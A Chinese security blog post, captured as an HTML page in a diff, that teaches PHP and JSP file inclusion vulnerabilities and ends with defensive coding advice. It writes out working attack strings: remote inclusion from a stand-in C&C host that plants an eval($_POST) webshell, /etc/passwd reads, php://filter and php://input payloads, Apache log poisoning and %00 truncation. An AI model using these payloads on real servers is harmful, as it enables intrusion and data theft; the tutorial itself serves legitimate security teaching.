@@ -1,0 +1,395 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>文件包含漏洞 | txjg blog</title>
+  <meta name="author" content="txjg">
+  
+  <meta name="description" content="文件包含漏洞文件包含漏洞出现的可能在PHP应用中居多（主要因为PHP语言提供的文件包含功能更强大更灵活)，在ASP，ASP.NET,JSP中出现的非常少
+包含漏洞原理php包含php中文件包含的函数与区别
+include() 找不到被包含的文件时只会产生警告(E_WARNING),脚本将继续执行
+i">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="文件包含漏洞"/>
+  <meta property="og:site_name" content="txjg blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="txjg blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">  
+  <link rel="stylesheet" href="/css/sidenav.css" media="screen" type="text/css">  
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body id="body" data-spy="scroll" data-target=".toc">
+  <div class="container" id="container">
+	<div class="content">
+	  <div class="page-header">		
+  <h1><a class="brand" href="/">txjg blog</a><span class="split"></span><span class="title">文件包含漏洞</span><span class="date" id="title-date"><i class="fa fa-clock-o"></i> 2022-02-21</span></h1>
+</div>		
+
+<div class="row page">
+  <!-- cols -->	
+  
+  <div class="col-xs-12 col-sm-3 col-md-3 toc"> 
+	<!-- toc -->
+<script type="text/javascript">
+		jQuery(document).ready(function() {
+ 		   generateWikiTOC('.note', '.toc',  2 , 2 );
+		});
+</script>
+  </div><!-- col-md-3 -->
+  
+  
+
+  
+  <div class="col-xs-12 col-sm-9 col-md-9 note">
+	
+
+	  <!-- content -->
+	  <h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="文件包含漏洞出现的可能"><a href="#文件包含漏洞出现的可能" class="headerlink" title="文件包含漏洞出现的可能"></a>文件包含漏洞出现的可能</h2><p>在PHP应用中居多（主要因为PHP语言提供的文件包含功能更强大更灵活)，在ASP，ASP.NET,JSP中出现的非常少</p>
+<h2 id="包含漏洞原理"><a href="#包含漏洞原理" class="headerlink" title="包含漏洞原理"></a>包含漏洞原理</h2><h3 id="php包含"><a href="#php包含" class="headerlink" title="php包含"></a>php包含</h3><h4 id="php中文件包含的函数与区别"><a href="#php中文件包含的函数与区别" class="headerlink" title="php中文件包含的函数与区别"></a>php中文件包含的函数与区别</h4><ul>
+<li>include() 找不到被包含的文件时只会产生警告(E_WARNING),脚本将继续执行</li>
+<li>include_once() 与include()类似，唯一区别是如果该文件中的代码已经被包含则不会再次包含</li>
+<li>require() 找不到被包含的文件时就会产生致命错误(E_COMPILE_ERROR),并停止脚本</li>
+<li>require_once() 与require()类似，唯一区别是如果该文件中的代码已经被包含则不会再次包含</li>
+</ul>
+<h4 id="php文件包含"><a href="#php文件包含" class="headerlink" title="php文件包含"></a>php文件包含</h4><ul>
+<li>本地包含（Local File Include,LFI)对本地文件进行包含<br>举例：(1)存在phpinfo.txt,文件内容是php代码：<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+(2)index.php文件包含phpinfo.txt:<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phpinfo.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+(3)访问index.php，phpinfo.txt被成功解析<img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/phpinfo.png" class="">
+注：当被包含的文件内容符合php语法规范，不论文件后缀名是什么，都可以被php解析;<br>当被包含的文件内容不符合php语法规范，则会暴露该文件的源代码</li>
+<li>远程包含（Remote File Include,RFI)对远程文件进行包含<br>远程包含的前提：php开启远程包含功能选项（php默认关闭）<br>php开启远程包含功能选项：(1)打开php.ini文件	（2）将allow_url_include &#x3D; Off的Off改为On	(3)重启web容器服务使其生效<br>举例：(1)<a href="http://www.hack.com根目录下存在phpinfo.txt文件：">http://www.hack.com根目录下存在phpinfo.txt文件：</a><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+(2)index.php文件：<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+(3)访问URL:<a target="_blank" rel="noopener" href="http://www.xsser.com/index.php?page=http://www.hack.com/phpinfo.txt,phpinfo.txt%E8%A2%AB%E6%88%90%E5%8A%9F%E8%A7%A3%E6%9E%90">http://www.xsser.com/index.php?page=http://www.hack.com/phpinfo.txt,phpinfo.txt被成功解析</a><img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/php.png" class="">
+注：远程包含与本地包含没有区别，无论是哪种扩展名，只要被包含文件符合php语法规范，php解析器就会对其解析;<br>如果被包含的文件在服务器端不存在，则会显示警告信息，暴露出网站的绝对路径:<img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/path.png" class=""></li>
+</ul>
+<h4 id="php文件包含利用"><a href="#php文件包含利用" class="headerlink" title="php文件包含利用"></a>php文件包含利用</h4><ul>
+<li><p>读取敏感文件<br>访问URL:<a target="_blank" rel="noopener" href="http://www.example.com/index.php?page=/etc/passwd">http://www.example.com/index.php?page=/etc/passwd</a><br>如果目标主机上存在该文件，并且有相应的权限，就可以读取文件的内容；<br>如果目标主机上存在该文件，但没有相应的权限，则会显示警告：</p>
+<img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/restriction.png" class="">
+<ul>
+<li>常见的敏感信息路径<ul>
+<li>windows系统  <img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/windows.png" class=""></li>
+<li>unix&#x2F;linux系统  <img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/linux.png" class=""></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>远程包含shell<br>前提：allow_url_fopen &#x3D; On<br>c&amp;c服务器端(<a href="http://www.hack.com)存在恶意文件echo.txt,文件内容为：">http://www.hack.com)存在恶意文件echo.txt,文件内容为：</a></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"shell.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;?php eval(<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span>xss<span class="token punctuation">]</span></span>);?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>访问URL:<a target="_blank" rel="noopener" href="http://www.example.com/index.php?page=http://www.hack.com/echo.txt">http://www.example.com/index.php?page=http://www.hack.com/echo.txt</a>,<br>则会在index.php所在的目录下生成shell.php,内容为一句话木马<code>&lt;?php eval($_POST[xss]);?&gt;</code></p>
+</li>
+<li><p>本地包含配合文件上传<br>目标网站有上传文件功能，我们利用此功能向目标网站上传一个文件(如：一句话木马图片),上传路径为.&#x2F;6.jpg:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"shell.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;?php eval(<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span>xss<span class="token punctuation">]</span></span>);?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>访问URL:<a target="_blank" rel="noopener" href="http://www.example.com/index.php?page=./6.jpg">http://www.example.com/index.php?page=./6.jpg</a>,<br>则会在index.php所在目录下生成shell.php,内容为一句话木马<code>&lt;?php eval($_POST[xss]);?&gt;</code></p>
+</li>
+<li><p>使用php封装协议<br>php带有很多内置URL风格的封装协议，这类协议与fopen(),copy(),file_exists(),filesize()等文件系统函数所提供的功能类似<br>常见的php内置协议</p>
+<pre class="line-numbers language-none"><code class="language-none">file:&#x2F;&#x2F;		#访问本地文件系统
+http:&#x2F;&#x2F;		#访问HTTP(s)网址
+ftp:&#x2F;&#x2F;		#访问FTP(s)URLs
+php:&#x2F;&#x2F;		#访问输入&#x2F;输出流(I&#x2F;O streams)
+zlib:&#x2F;&#x2F;		#压缩流
+data:&#x2F;&#x2F;		#数据(RFC 2397)
+ssh2:&#x2F;&#x2F;		#Secure Shell 2
+expect:&#x2F;&#x2F;	#处理交互式的流
+glob:&#x2F;&#x2F;		#查找匹配的文件路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>更多请参考：<a target="_blank" rel="noopener" href="http://php.net/manual/zh/wrappers.php">http://php.net/manual/zh/wrappers.php</a></p>
+<ul>
+<li>使用封装协议读取php文件<br>  访问URL:<a target="_blank" rel="noopener" href="http://www.example.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php">http://www.example.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php</a><br>  得到经过base64加密后的字符串,通过解密就可以得到原字符串</li>
+<li>写入php文件<br>  使用php:&#x2F;&#x2F;input可以执行php语句<br>  php:&#x2F;&#x2F;input使用的前提:allow_url_include &#x3D; On<br>  访问URL:<a target="_blank" rel="noopener" href="http://www.example.com/index.php?page=php://input">http://www.example.com/index.php?page=php://input</a> ,并且提交的数据为php语句，如： <code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#39;xss&#39;]);?&gt;&quot;);?&gt;</code><br>  则该php语句就会执行,就会在index.php所在目录生成shell.php文件<br>  例：<img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/input.png" class=""></li>
+</ul>
+</li>
+<li><p>包含apache日志文件<br>注：当目标存在本地文件包含漏洞却无法上传文件时，我们就无法生成webshell。这时，我们就可以通过找到apache路径，利用本地文件包含漏洞包含apache日志文件来获取webshell<br>apache运行后一般默认会生成两个日志文件：access.log(访问日志),error.log(错误日志)<br>access.log:记录了客户端的每次请求及服务器响应的相关信息</p>
+<img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/access_log.png" class="">
+<p>每一行记录一次网站访问记录，由7部分组成，格式如下:<br><code>客户端地址 访问者的标识 访问者的验证名字 请求的时间 请求类型 响应的HTTP状态码 发送给客户端的字节数</code></p>
+<pre class="line-numbers language-none"><code class="language-none">客户端地址：访问网站的客户端ip地址
+访问者的标识：该项一般为空白，用“-”替代
+访问者的验证名字：用于记录访问者身份验证时提供的名字。该项一般为空白
+请求的时间：记录访问操作的发生时间
+请求类型：记录了服务器收到的是什么类型的请求(GET,POST,HEAD等)
+响应的HTTP状态码：通过该项可以判断请求是否成功，一般为200
+发送给客户端的字节数：表示服务器发送给客户端的总字节数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li>利用方法：<br>  当访问一个不存在的资源时，apache日志同样会记录。因此在网站存在本地文件包含漏洞但却没有可包含的网页木马文件时就可以访问URL: <code>http://			www.example.com/&lt;?php phpinfo();?&gt;</code> ,apache会记录请求<code>&lt;?php phpinfo();?&gt;</code>并写入到access.log文件中，此时我们就可以包含access.log文件，就可以成功利用本地文件包含漏洞。<br>  注：使用浏览器访问URL:	<code>http://www.example.com/&lt;?php phpinfo();?&gt;</code>,浏览器会对php语句中的<code>&lt;</code>,<code>空格</code>,<code>&gt;</code>进行转码，因此写入apache日志的php语句就会变成<code>%3C?php%20phpinfo();%20?%3E</code>,这样就无法利用apache包含漏洞，我们可以使用burp来绕过编码：<ul>
+<li>绕过前<br>  apache日志  <img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/%E7%BB%95%E8%BF%87%E5%89%8D.png" class="">
+  burp  <img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/burp%E7%BB%95%E8%BF%87%E5%89%8D.png" class=""></li>
+<li>绕过后<br>  apache日志  <img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/%E7%BB%95%E8%BF%87%E5%90%8E.png" class="">
+  burp  <img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/burp%E7%BB%95%E8%BF%87%E5%90%8E.png" class=""></li>
+</ul>
+</li>
+</ul>
+<p>  注：在使用本地包含漏洞包含apache日志时，必须知道apache日志的路径，否则无法利用；<br>  安全建议：apache的路径是重点，所以在安装apache时尽量不要使用默认路径</p>
+</li>
+<li><p>截断包含<br>程序员以为的文件包含漏洞修复代码：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+		<span class="token keyword">include</span> <span class="token string double-quoted-string">"home.php"</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这段代码是程序员想以固定扩展名来修复文件包含漏洞:当我们访问URL:<code>http://www.example.com/index.php?page=echo.txt</code>时，要包含的文件就变成了<code>echo.txt.php</code>,这样的文件并不存在，从而无法正常利用文件包含漏洞</p>
+<ul>
+<li>使用截断的方法来绕过防护<br>  访问URL:<code>http://www.example.com/index.php?page=echo.txt%00</code><br>  使用前提：magic_quotes_gpc &#x3D; Off (如果magic_quotes_gpc &#x3D; On,%00(NULL)就会被转义，就无法起到截断的作用)<ul>
+<li>magic_quotes_gpc &#x3D; On时会对以下预定义字符转义：  <pre class="line-numbers language-none"><code class="language-none">&#39; (单引号)
+&quot; (双引号)
+\ (反斜杠)
+NULL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+  拓展：php老版本中也存在其他一些截断问题，不过现在已经很难见到了。如：<br>  <code>index.php?page=echo.txt./././././././././././...</code> #使用一定数量的<code>./</code>来截断</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>绕过WAF防火墙<br>文件包含漏洞有时被用来制作后门，来躲避web杀毒软件的检测。如:包含一句话木马图片</p>
+</li>
+</ul>
+<h3 id="JSP包含"><a href="#JSP包含" class="headerlink" title="JSP包含"></a>JSP包含</h3><p>JSP包含分为：静态包含，动态包含</p>
+<h4 id="静态包含"><a href="#静态包含" class="headerlink" title="静态包含"></a>静态包含</h4><p>语法:<code>&lt;%@ include file=&quot;被包含的文件&quot; %&gt;</code><br>原理：先进行包含，再做处理操作(编译)。不能包含一个动态页面(变量)<br>例：被包含的文件6.txt,文件内容为:</p>
+<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page language&#x3D;&quot;java&quot; pageEncoding&#x3D;&quot;UTF-8&quot;%&gt;
+&lt;%
+	out.println(&quot;hello&quot;);
+%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>用index.jsp包含6.txt:</p>
+<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ include file&#x3D;&quot;6.txt&quot; %&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>用浏览器访问index.jsp，6.txt会被当成jsp文件解析<br>注：JSP语法规定：include指令为静态包含，只允许包含一个已经存在于服务器中的文件，而不能使用变量来控制包含某个文件。这就意味着使用include指令将不存在文件包含漏洞</p>
+<h4 id="动态包含"><a href="#动态包含" class="headerlink" title="动态包含"></a>动态包含</h4><p>语法:<code>&lt;jsp:include page=&quot;被包含的文件&quot; /&gt;</code><br>原理:先处理被包含文件(编译),然后再包含。可以包含一个动态页面(变量)<br>例：被包含的文件6.txt,文件内容为：</p>
+<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%
+	String pages &#x3D; request.getParameter(&quot;page&quot;);
+%&gt;
+&lt;jsp:include page&#x3D;&quot;&lt;%&#x3D;pages%&gt;&quot; &#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>用浏览器访问index.jsp,6.txt未被当成jsp文件解析<br>注：当<code>&lt;jsp:include/&gt;</code>标签在包含一个非jsp文件扩展名时，即使文件内容为JSP代码，也不会以JSP来解析，只会暴露其源代码。这就意味着即使攻击者能够控制JSP所包含的页面(页面通常为非jsp扩展名，因为jsp文件一般不让上传),得到的信息也是有限的。所以攻击者一般包含一些web容器的配置文件，如:tomcat的user.xml</p>
+<h2 id="安全编写包含"><a href="#安全编写包含" class="headerlink" title="安全编写包含"></a>安全编写包含</h2><p>造成文件包含漏洞的根本原因:被包含的页面可以被攻击者所控制(攻击者可以随心所欲的去包含某个页面)</p>
+<h3 id="防御文件包含漏洞的措施"><a href="#防御文件包含漏洞的措施" class="headerlink" title="防御文件包含漏洞的措施"></a>防御文件包含漏洞的措施</h3><ul>
+<li>严格判断包含中的参数是否外部可控</li>
+<li>路径限制：限制被包含的文件只能在某一文件夹内，一定要禁止目录跳转字符，如：<code>../</code></li>
+<li>包含文件验证：验证被包含的文件是否是白名单中的一员</li>
+<li>尽量不要使用动态包含，可以在需要包含的页面固定写好，如:<code>include(&quot;head.php&quot;)</code></li>
+</ul>
+	  
+
+	  <div>
+  		<center>
+		  <div class="pagination">
+<ul class="pagination">
+	
+	
+	
+	
+	
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+	
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+			
+		
+	
+		
+			
+			
+			
+		
+			
+		
+	
+		
+	
+		
+			
+		
+	
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+	
+	
+		<li class="prev"><a href="/2022/03/07/CSRF%E6%BC%8F%E6%B4%9E/" class="alignleft prev"><i class="fa fa-arrow-circle-o-left"></i>prev</a></li>
+	
+	<li><a href="/"><i class="fa fa-archive"></i>Home</a></li>
+	
+		<li class="next"><a href="/2021/12/22/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="alignright next">next<i class="fa fa-arrow-circle-o-right"></i></a></li>
+	
+</ul>
+</div>
+
+		</center>
+	  </div>
+	  
+	</div> <!-- col-md-9/col-md-12 -->
+	
+  </div><!-- row -->
+
+	</div>
+  </div>
+  <div class="container-narrow">
+	<footer> <p>
+  &copy; 2022 txjg
+  
+      with help from <a href="http://zespia.tw/hexo/" target="_blank">Hexo</a> and <a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a>. Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-wixo/">Wixo</a>.    
+</p> </footer>
+  </div> <!-- container-narrow -->
+  
+<a id="gotop" href="#">   
+  <span>▲</span> 
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/jquery.tableofcontents.min.js"></script>
+<script src="/js/tocgenerator.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+
+</body>
+</html>
